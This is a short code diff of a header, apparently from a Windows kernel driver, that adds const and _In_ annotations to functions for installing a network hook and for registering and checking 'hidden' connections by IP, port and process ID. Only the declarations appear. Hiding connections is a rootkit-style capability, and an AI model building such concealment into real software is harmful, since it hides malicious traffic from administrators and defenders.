@@ -26,10 +26,13 @@ namespace NetHook
 
 	NTSTATUS InitNetworkHook();
 
-	VOID NetAddHiddenConnection(PNETHOOK_HIDDEN_CONNECTION NewConnection);
+	VOID NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection);
 
 	VOID UnHookNetworkProxy();
 
-	BOOLEAN NetIsHiddenIpAddress(ULONG IpAddress, USHORT PortNumber, ULONG RemoteIpAddress, ULONG ConnectPID);
+	BOOLEAN NetIsHiddenIpAddress(_In_ const ULONG IpAddress, 
+		_In_ const USHORT PortNumber, 
+		_In_ const ULONG RemoteIpAddress, 
+		_In_ const ULONG ConnectPID);
 }
 
